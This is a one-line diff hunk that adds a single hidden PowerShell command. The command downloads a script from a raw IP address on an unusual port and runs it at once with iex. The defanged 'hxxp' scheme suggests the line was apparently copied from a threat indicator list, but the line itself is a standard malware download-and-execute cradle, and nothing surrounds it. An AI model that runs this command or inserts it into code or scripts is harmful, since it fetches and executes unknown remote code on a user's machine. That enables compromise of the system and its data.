@@ -1,0 +1,1 @@
+PowerShell.exe -w hidden -noni -nop -c “iex(New-Object System.Net.WebClient).DownloadString(‘hxxp://139.59.46.154:3485/eiloShaegae1’)”
